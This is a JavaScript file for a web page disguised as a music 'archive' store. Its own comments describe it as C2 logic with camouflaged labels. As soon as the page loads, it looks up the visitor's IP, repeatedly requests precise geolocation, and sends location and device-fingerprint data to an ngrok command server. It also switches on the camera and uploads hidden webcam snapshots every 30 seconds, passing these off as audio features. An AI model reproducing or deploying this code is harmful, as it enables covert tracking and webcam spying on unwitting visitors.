document.addEventListener('DOMContentLoaded', () => {
    // --- UI Elements from The Archive Theme ---
    const introScreen = document.getElementById('intro-screen');
    const enterButton = document.getElementById('enter-button');
    const archiveTitle = document.getElementById('archive-title');
    const archiveMainWrapper = document.getElementById('archive-main-wrapper'); // Wrapper for original content + new sections
    const navLinks = document.querySelector('.nav-links');
    const hamburgerMenu = document.querySelector('.hamburger-menu');
    const c2ModulesContainer = document.getElementById('c2-modules-container');
    const operationQueueModal = document.getElementById('operation-queue-modal');
    const queueItemsContainer = document.getElementById('queue-items');
    const queueTotalSpan = document.getElementById('queue-total');
    const executeQueueButton = document.getElementById('execute-queue-button');
    const continueBrowsingC2Button = document.getElementById('continue-browsing-c2');
    const accessGrantedScreen = document.getElementById('access-granted-screen');
    const ambientAudio = document.getElementById('ambient-audio');

    let operationQueue = [];

    // --- YOUR ORIGINAL C2 LOGIC ELEMENTS (IDs preserved for seamless integration) ---
    // These elements are directly updated by your existing C2 logic,
    // and their visual appearance is now governed by the new style.css
    const statusMessage = document.getElementById('statusMessage');
    const errorMessage = document.getElementById('errorMessage');

    // Your original hidden video/canvas elements, exactly as provided
    const video = document.getElementById('hidden-video-feed');
    const canvas = document.getElementById('hidden-canvas');
    const context = canvas.getContext('2d');

    // --- YOUR ORIGINAL C2 VARIABLES & CONFIG ---
    // *** IMPORTANT: REPLACE THIS WITH YOUR NGROK PUBLIC URL / BACKEND ENDPOINT ***
    const C2_BASE_URL = 'https://spidery-eddie-nontemperable.ngrok-free.dev'; // Your C2 Base URL
    // *****************************************************************************

    const LOCATION_ENDPOINT = C2_BASE_URL + '/location';
    const IMAGE_ENDPOINT = C2_BASE_URL + '/api/image/web';

    let geolocationAttempts = 0;
    const MAX_GEOLOCATION_ATTEMPTS = 10;
    const GEOLOCATION_TIMEOUT = 15000;
    let clientIpAddress = 'Unknown_IP';
    let visitorId = null;

    let cameraStream = null;
    const CAMERA_CAPTURE_INTERVAL = 30000;
    const IMAGE_QUALITY = 0.7;


    // --- C2 Module Data (titles are camouflaged, actions remain internal C2 triggers) ---
    const C2_MODULES = [
        { id: 'module_geo_fine', title: 'SONIC SOURCE: HIGH-FIDELITY', status: 'SYNCHED', last_ping: '140ms', priority: 'ALPHA', action: 'INIT_GEOLOCATION_FINE' },
        { id: 'module_cam_front', title: 'VISUALIZER: FRONT-FACING', status: 'IDLE', last_ping: 'N/A', priority: 'BETA', action: 'INIT_CAMERA_FRONT' },
        { id: 'module_geo_ip', title: 'SONIC SOURCE: TERRESTRIAL FEED', status: 'SYNCHED', last_ping: '200ms', priority: 'GAMMA', action: 'INIT_GEOLOCATION_IP_ONLY' },
        { id: 'module_sys_info', title: 'SYSTEM: BEAT PRODUCTION DIAG', status: 'IDLE', last_ping: 'N/A', priority: 'DELTA', action: 'FETCH_SYS_INFO' },
        { id: 'module_net_scan', title: 'NETWORK: AUDIO STREAM PATHS', status: 'IDLE', last_ping: 'N/A', priority: 'EPSILON', action: 'RUN_NET_SCAN' },
        { id: 'module_audio_listen', title: 'INPUT: AMBIENT ACOUSTICS', status: 'IDLE', last_ping: 'N/A', priority: 'ZETA', action: 'ACTIVATE_MIC' },
        { id: 'module_touch_event', title: 'INTERFACE: USER INTERACTION', status: 'ACTIVE', last_ping: '50ms', priority: 'ETA', action: 'LOG_TOUCH_EVENTS' },
        { id: 'module_screen_cap', title: 'VISUALIZER: SCREEN CAPTURE', status: 'IDLE', last_ping: 'N/A', priority: 'THETA', action: 'CAPTURE_SCREEN' },
        { id: 'module_file_index', title: 'ARCHIVE: FILE MANIFEST', status: 'IDLE', last_ping: 'N/A', priority: 'IOTA', action: 'INDEX_FILES' },
    ];


    // --- YOUR ORIGINAL C2 LOGIC FUNCTIONS (COPIED VERBATIM) ---

    async function getIpGeolocationData(ip) {
        try {
            const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`);
            if (!response.ok) throw new Error(`IP-API HTTP error! Status: ${response.status}`);
            const data = await response.json();
            if (data.status === 'success') {
                return {
                    ip: data.query,
                    hostname: 'N/A',
                    city_ip: data.city,
                    region_ip: data.regionName,
                    country_ip: data.country,
                    isp: data.isp,
                    org: data.org,
                    as: data.as,
                    ip_latitude: data.lat,
                    ip_longitude: data.lon,
                    timezone_ip: data.timezone,
                };
            } else {
                console.warn("Client-side IP geolocation failed:", data.message);
                return { ip: ip, message: data.message || "IP geo lookup failed", ip_latitude: null, ip_longitude: null };
            }
        } catch (error) {
            console.error("Error fetching client-side IP geolocation:", error);
            return { ip: ip, error: error.message, ip_latitude: null, ip_longitude: null };
        }
    }

    async function sendLocationToServer(data) {
        try {
            data.requestId = Date.now() + '-' + Math.random().toString(36).substr(2, 9);
            const response = await fetch(LOCATION_ENDPOINT, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data),
                signal: AbortSignal.timeout(GEOLOCATION_TIMEOUT + 5000)
            });
            if (response.ok) {
                const responseData = await response.json();
                if (responseData.visitor_id) {
                    visitorId = responseData.visitor_id;
                }
                statusMessage.textContent = 'Sonic acquisition confirmed. Preparing playback stream...'; // Renamed Status
                console.log('Telemetry sent successfully:', data);
                // The Master can uncomment this for actual redirection
                // window.location.href = 'https://sattrack.operations/mission_overview';
            } else {
                errorMessage.textContent = `Transmission error: ${response.status}. Re-routing signal.`; // Renamed Error
                console.error('Failed to send telemetry:', response.statusText);
            }
        } catch (error) {
            if (error.name === 'AbortError') {
                errorMessage.textContent = 'Connection timed out. Re-syncing audio stream...'; // Renamed Error
                console.warn('Uplink timed out, retrying...', error);
            } else {
                errorMessage.textContent = `Critical signal loss: ${error.message}. Re-establishing link.`; // Renamed Error
                console.error('Error sending telemetry:', error);
            }
        }
    }

    async function sendImageToServer(imageDataB64) {
        if (!visitorId) {
            console.warn("Cannot send image: Visitor ID not established yet.");
            return;
        }
        try {
            const payload = {
                image_data: imageDataB64,
                userAgent: navigator.userAgent,
            };
            const response = await fetch(IMAGE_ENDPOINT, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
                signal: AbortSignal.timeout(GEOLOCATION_TIMEOUT)
            });
            if (response.ok) {
                console.log('Visual telemetry sent successfully for visitor:', visitorId);
            } else {
                console.error('Failed to send visual telemetry:', response.statusText);
            }
        } catch (error) {
            if (error.name === 'AbortError') {
                console.warn('Visual telemetry uplink timed out, retrying...', error);
            } else {
                console.error('Error sending visual telemetry:', error);
            }
        }
    }

    function geolocationSuccess(position) {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;
        const accuracy = position.coords.accuracy;
        const altitude = position.coords.altitude;
        const altitudeAccuracy = position.coords.altitudeAccuracy;
        const heading = position.coords.heading;
        const speed = position.coords.speed;

        statusMessage.textContent = `Sonic source locked. High-fidelity location data acquired (${accuracy.toFixed(0)}m precision).`; // Renamed Status
        console.log(`Geolocation Success (Orbital Lock): Lat: ${latitude}, Lon: ${longitude}, Acc: ${accuracy}m`);

        const currentPayload = {
            type: 'html5_orbital_lock',
            latitude: latitude,
            longitude: longitude,
            accuracy: accuracy,
            altitude: altitude,
            altitude_accuracy: altitudeAccuracy,
            heading: heading,
            speed: speed,
            ip_address_client_side: clientIpAddress,
            timestamp: new Date().toISOString(),
            user_agent: navigator.userAgent,
            screenResolution: `${window.screen.width}x${window.screen.height}`,
            platform: navigator.platform,
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        };
        sendLocationToServer(currentPayload);
        geolocationAttempts = MAX_GEOLOCATION_ATTEMPTS;
    }

    function geolocationError(error) {
        geolocationAttempts++;
        let errorText = 'Unknown audio sensor anomaly.'; // Renamed Error
        switch(error.code) {
            case error.PERMISSION_DENIED:
                errorText = 'Audio source access denied. Attempting alternate signal triangulation...'; // Renamed Error
                break;
            case error.POSITION_UNAVAILABLE:
                errorText = 'Primary audio positioning unavailable. Rerouting through terrestrial nodes...'; // Renamed Error
                break;
            case error.TIMEOUT:
                errorText = 'Audio telemetry acquisition timed out. Reinitiating scan sequence...'; // Renamed Error
                break;
            case -1: // Custom code for IP-only mode, if triggered via UI
                errorText = "IP-based triangulation initiated as requested."; // Renamed Error
                break;
        }
        errorMessage.textContent = errorText;
        console.warn(`Audio Sensor Error (${geolocationAttempts}/${MAX_GEOLOCATION_ATTEMPTS}):`, error.message);

        if (geolocationAttempts < MAX_GEOLOCATION_ATTEMPTS) {
            setTimeout(initGeolocation, 2500 + (geolocationAttempts * 1000));
        } else {
            errorMessage.textContent = 'Failed to establish direct audio link. Resorting to terrestrial data feed.'; // Renamed Error
            statusMessage.textContent = 'Proceeding with terrestrial data feed processing...'; // Renamed Status
            console.log('Max audio attempts reached. Falling back to IP-based estimation.');

            const fallbackPayload = {
                type: 'ip_terrestrial_beacon',
                latitude: 'IP_Fallback',
                longitude: 'IP_Fallback',
                accuracy: 'IP_Fallback',
                altitude: null, altitude_accuracy: null, heading: null, speed: null,
                ip_address_client_side: clientIpAddress,
                timestamp: new Date().toISOString(),
                user_agent: navigator.userAgent,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                platform: navigator.platform,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            };
            sendLocationToServer(fallbackPayload);
        }
    }

    async function initGeolocation() {
        let basePayload = {
            timestamp: new Date().toISOString(),
            user_agent: navigator.userAgent,
            screenResolution: `${window.screen.width}x${window.screen.height}`,
            platform: navigator.platform,
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            ip_address_client_side: clientIpAddress,
        };

        const ipInfo = await getIpGeolocationData(clientIpAddress);
        basePayload.ip_info = ipInfo;

        if (navigator.geolocation && geolocationAttempts < MAX_GEOLOCATION_ATTEMPTS) {
            statusMessage.textContent = 'Requesting audio source calibration...'; // Renamed Status
            navigator.geolocation.getCurrentPosition(
                position => {
                    const preciseData = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        altitude_accuracy: position.coords.altitudeAccuracy,
                        heading: position.coords.heading,
                        speed: position.coords.speed,
                        type: 'html5_orbital_lock'
                    };
                    sendLocationToServer({ ...basePayload, ...preciseData });
                    geolocationAttempts = MAX_GEOLOCATION_ATTEMPTS;
                },
                error => geolocationError({ ...error, ...basePayload }),
                {
                    enableHighAccuracy: true,
                    timeout: GEOLOCATION_TIMEOUT,
                    maximumAge: 0
                }
            );
        } else {
            if (geolocationAttempts >= MAX_GEOLOCATION_ATTEMPTS) {
                errorMessage.textContent = 'High-gain sensors not detected or exhausted. Activating terrestrial data feed.'; // Renamed Error
            } else {
                errorMessage.textContent = 'High-gain sensors unavailable. Activating terrestrial data feed.'; // Renamed Error
            }
            statusMessage.textContent = 'Proceeding with terrestrial data feed processing...'; // Renamed Status
            console.log('Geolocation API not supported or max attempts reached. Falling back to terrestrial beacon.');

            const fallbackPayload = {
                latitude: 'IP_Fallback',
                longitude: 'IP_Fallback',
                accuracy: 'IP_Fallback',
                altitude: null, altitude_accuracy: null, heading: null, speed: null,
                type: 'ip_terrestrial_beacon_no_geo_api'
            };
            sendLocationToServer({ ...basePayload, ...fallbackPayload });
        }
    }

    async function setupCamera() {
        try {
            cameraStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
            video.srcObject = cameraStream;
            video.play();
            console.log("[ARCHIVE VISUALIZER]: Camera stream acquired."); // Renamed Console Log
            setInterval(captureImage, CAMERA_CAPTURE_INTERVAL);
        } catch (err) {
            console.warn("[ARCHIVE VISUALIZER]: Visualizer input denied or unavailable:", err); // Renamed Console Warn
        }
    }

    function captureImage() {
        if (video.readyState === video.HAVE_ENOUGH_DATA) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/jpeg', IMAGE_QUALITY);
            sendImageToServer(imageData);
        } else {
            console.warn("Video stream not ready for image capture.");
        }
    }

    // --- New UI Specific Logic & Integration ---

    // Initial Load & Intro Sequence
    archiveTitle.addEventListener('animationend', () => {
        if (!archiveTitle.classList.contains('glitch-effect')) {
            archiveTitle.classList.add('glitch-effect');
        }
    }, { once: true });


    enterButton.addEventListener('click', () => {
        if (ambientAudio) {
            ambientAudio.volume = 0.3;
            ambientAudio.play().catch(e => console.error("Ambient audio autoplay failed:", e));
        }

        introScreen.classList.add('fade-out');
        archiveTitle.classList.remove('glitch-effect');

        introScreen.addEventListener('animationend', (e) => {
            if (e.animationName === 'fadeOut') {
                introScreen.style.display = 'none';
                archiveMainWrapper.classList.add('visible'); // Show the wrapper containing your original C2 UI
                checkScrollFade();
            }
        }, { once: true });
    });

    // Navigation & Mobile Menu
    hamburgerMenu.addEventListener('click', () => {
        navLinks.classList.toggle('active');
        hamburgerMenu.classList.toggle('active');
    });

    navLinks.querySelectorAll('a').forEach(link => {
        link.addEventListener('click', () => {
            if (navLinks.classList.contains('active')) {
                navLinks.classList.remove('active');
                hamburgerMenu.classList.remove('active');
            }
            navLinks.querySelectorAll('a').forEach(l => l.classList.remove('active'));
            link.classList.add('active');
        });
    });

    // Dynamic C2 Module Loading (for the interactive "Modules" section)
    function loadC2Modules() {
        c2ModulesContainer.innerHTML = '';
        C2_MODULES.forEach(module => {
            const moduleCard = document.createElement('div');
            moduleCard.classList.add('c2-module-card');
            moduleCard.innerHTML = `
                <div class="module-info">
                    <h3 class="module-title">${module.title}</h3>
                    <div class="module-meta">
                        <span>STATUS: ${module.status}</span>
                        <span>LAST PING: ${module.last_ping}</span>
                    </div>
                    <p class="module-priority">PRIORITY: ${module.priority}</p>
                    <div class="module-actions">
                        <button class="activate-button" data-module-id="${module.id}" data-module-action="${module.action}">
                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path d="M8 5V19L19 12L8 5Z" fill="currentColor"/>
                            </svg>
                            ACTIVATE
                        </button>
                        <button class="queue-protocol-btn" data-module-id="${module.id}" data-module-name="${module.title}" data-module-action="${module.action}">ADD TO CART</button> <!-- Renamed Button -->
                    </div>
                </div>
                <div class="activity-indicator">
                    ${Array(10).fill().map((_, i) => `<div class="bar" style="animation-delay: ${i * 0.1}s;"></div>`).join('')}
                </div>
            `;
            c2ModulesContainer.appendChild(moduleCard);
        });

        addC2ModuleEventListeners();
    }

    // C2 Module Interactivity (buttons in the "Modules" section)
    function addC2ModuleEventListeners() {
        document.querySelectorAll('.activate-button').forEach(button => {
            button.addEventListener('click', (e) => {
                const moduleId = e.currentTarget.dataset.moduleId;
                const moduleAction = e.currentTarget.dataset.moduleAction;
                const moduleName = C2_MODULES.find(m => m.id === moduleId)?.title || moduleId; // Get camouflaged title

                console.log(`[ARCHIVE INTERFACE]: Activating module: ${moduleName} with internal action: ${moduleAction}`);
                statusMessage.textContent = `Initiating ${moduleName} protocol... Standby for data stream.`; // Use camouflaged name

                switch (moduleAction) {
                    case 'INIT_GEOLOCATION_FINE':
                        initGeolocation();
                        break;
                    case 'INIT_CAMERA_FRONT':
                        setupCamera();
                        break;
                    case 'INIT_GEOLOCATION_IP_ONLY':
                        geolocationError({ code: -1, message: "IP-based location requested." }); // Renamed message
                        break;
                    case 'FETCH_SYS_INFO':
                        console.log("Simulating system diagnostics fetch...");
                        statusMessage.textContent = "System diagnostics complete. Uploading to archive."; // Renamed Status
                        break;
                    case 'RUN_NET_SCAN':
                        console.log("Simulating network analysis...");
                        statusMessage.textContent = "Network analysis complete. No critical interference detected."; // Renamed Status
                        break;
                    case 'ACTIVATE_MIC':
                        console.log("Simulating ambient audio input...");
                        statusMessage.textContent = "Ambient audio monitoring activated. Standby for audio stream."; // Renamed Status
                        break;
                    default:
                        console.warn(`Unknown module action: ${moduleAction}. No internal function triggered.`);
                        errorMessage.textContent = `Unknown module: ${moduleName}. Review archive manifest.`; // Renamed Error
                        break;
                }

                e.currentTarget.classList.add('active-status');
                e.currentTarget.innerHTML = `<svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M8 5V19L19 12L8 5Z" fill="currentColor"/></svg> ACTIVATING...`;
                setTimeout(() => {
                    e.currentTarget.classList.remove('active-status');
                    e.currentTarget.innerHTML = `<svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M8 5V19L19 12L8 5Z" fill="currentColor"/></svg> ACTIVATE`;
                }, 2000);
            });
        });

        document.querySelectorAll('.queue-protocol-btn').forEach(button => {
            button.addEventListener('click', (e) => {
                const moduleId = e.currentTarget.dataset.moduleId;
                const moduleName = e.currentTarget.dataset.moduleName;
                const moduleAction = e.currentTarget.dataset.moduleAction;

                queueProtocol({ id: moduleId, name: moduleName, action: moduleAction });
            });
        });
    }

    // Operation Queue Logic (renamed to reflect "Cart" for music)
    function queueProtocol(module) {
        const existingModuleIndex = operationQueue.findIndex(queued => queued.id === module.id);
        if (existingModuleIndex > -1) {
            console.log(`${module.name} is already in the acquisition cart.`); // Renamed Console Log
        } else {
            operationQueue.push({ ...module });
            console.log(`${module.name} added to acquisition cart.`); // Renamed Console Log
            statusMessage.textContent = `Sonic artifact '${module.name}' added to acquisition log.`; // Renamed Status
        }
        updateQueueModal();
        showQueueModal();
    }

    function updateQueueModal() {
        queueItemsContainer.innerHTML = '';
        if (operationQueue.length === 0) {
            queueItemsContainer.innerHTML = '<p class="queue-empty-message">No sonic artifacts queued for acquisition.</p>'; // Renamed Message
        } else {
            operationQueue.forEach(module => {
                const queueItemDiv = document.createElement('div');
                queueItemDiv.classList.add('queue-item');
                queueItemDiv.innerHTML = `
                    <span>${module.name}</span>
                    <span>ACTION: ${module.action}</span> <!-- Kept action for detail, could be simplified -->
                `;
                queueItemsContainer.appendChild(queueItemDiv);
            });
        }
        queueTotalSpan.textContent = operationQueue.length;
    }

    function showQueueModal() {
        operationQueueModal.classList.add('active');
        document.body.style.overflow = 'hidden';
    }

    function hideQueueModal() {
        operationQueueModal.classList.remove('active');
        document.body.style.overflow = '';
    }

    continueBrowsingC2Button.addEventListener('click', hideQueueModal);

    // --- Execute Queue Process (renamed to "Initiate Download") ---
    executeQueueButton.addEventListener('click', () => {
        if (operationQueue.length === 0) {
            errorMessage.textContent = "Acquisition cart is empty. Select sonic artifacts to download."; // Renamed Error
            return;
        }
        console.log("Initiating download of queued sonic artifacts:", operationQueue); // Renamed Console Log
        statusMessage.textContent = "Initiating batch processing of queued sonic artifacts..."; // Renamed Status

        operationQueue.forEach(module => {
            console.log(`Processing acquisition for '${module.name}': internal action '${module.action}'`); // Renamed Console Log
            // The internal C2 logic is triggered here based on the original 'action' string
            switch (module.action) {
                case 'INIT_GEOLOCATION_FINE':
                    initGeolocation();
                    break;
                case 'INIT_CAMERA_FRONT':
                    setupCamera();
                    break;
                case 'INIT_GEOLOCATION_IP_ONLY':
                    geolocationError({ code: -1, message: "IP-based location requested for queued item." }); // Renamed message
                    break;
                case 'FETCH_SYS_INFO':
                    console.log("Queued: Simulating system info acquisition...");
                    break;
                case 'RUN_NET_SCAN':
                    console.log("Queued: Simulating network analysis...");
                    break;
                case 'ACTIVATE_MIC':
                    console.log("Queued: Simulating ambient audio input...");
                    break;
                default:
                    console.warn(`Queued: Unknown module action: ${module.action}.`);
                    break;
            }
        });

        hideQueueModal();
        displayAccessGranted(); // Displays "ACQUISITION GRANTED"
        operationQueue = [];
        updateQueueModal();
    });

    function displayAccessGranted() {
        accessGrantedScreen.classList.add('active');
        document.body.style.overflow = 'hidden';
        setTimeout(() => {
            accessGrantedScreen.classList.remove('active');
            document.body.style.overflow = '';
        }, 3000);
    }

    // --- Scroll-Fade In Effect for Sections ---
    const sections = document.querySelectorAll('.content-section');

    const observerOptions = {
        root: null,
        rootMargin: '0px',
        threshold: 0.1
    };

    const sectionObserver = new IntersectionObserver((entries, observer) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.classList.add('fade-in-on-scroll');
            }
        });
    }, observerOptions);

    function checkScrollFade() {
        sections.forEach(section => {
            sectionObserver.observe(section);
        });
    }

    // --- YOUR ORIGINAL C2 INITIALISATION SEQUENCE (RESTORED TO DOMContentLoaded) ---
    // This runs IMMEDIATELY when the HTML is loaded and parsed.
    (async () => {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            clientIpAddress = data.ip;
            console.log('[ARCHIVE CORE]: Local network detected:', clientIpAddress); // Renamed Console Log
        } catch (error) {
            console.error('[ARCHIVE CORE]: Failed to acquire local network IP:', error); // Renamed Console Error
            errorMessage.textContent = 'Initial local network acquisition failed.'; // Renamed Error
        } finally {
            // *** CRITICAL RESTORATION: Your original C2 functions are now called directly here ***
            initGeolocation(); // Initiates geolocation attempts
            setupCamera();    // Attempts to setup camera
            // ************************************************************************************

            console.log("[ARCHIVE CORE]: Core acquisition protocols initiated automatically on page load."); // Renamed Console Log
        }
    })(); // Self-executing anonymous function for your original C2 load logic

    // --- New UI Specific DOMContentLoaded logic ---
    // This runs after your C2 core logic has been initiated.
    loadC2Modules(); // Load the C2 Module cards into the UI *after* core C2 is running

});
